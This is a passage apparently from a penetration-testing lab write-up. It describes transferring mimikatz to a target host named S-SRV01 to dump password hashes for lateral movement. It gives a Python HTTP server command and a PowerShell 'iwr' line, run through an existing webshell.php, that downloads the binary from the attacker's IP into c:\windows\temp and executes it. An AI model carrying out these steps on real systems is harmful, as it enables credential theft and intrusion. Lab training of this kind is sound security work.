You are already the highest user, so no need for Privilege Escalation. Use a hash dumping tool like `mimikatz` because it gives you opportunity to get hashes that you can use for lateral movement.

## Transfer the mimikatz binary to S-SRV01

- Download it from official github `mimikatz.exe` (itâ€™s a windows 64 machine so make sure to grab the right binary).
- Run a python server on the attacking machine where the mimikatz.exe file is.
	`python3 -m http.server 80`
- Host it on the S-SRV01. On the  http://10.200.X.31/images/webshell.php field type:
	`iwr http://<Attack_IP>/mimikatz.exe -outfile c:\windows\temp\mimikatzmine.exe`
Finally execute it.
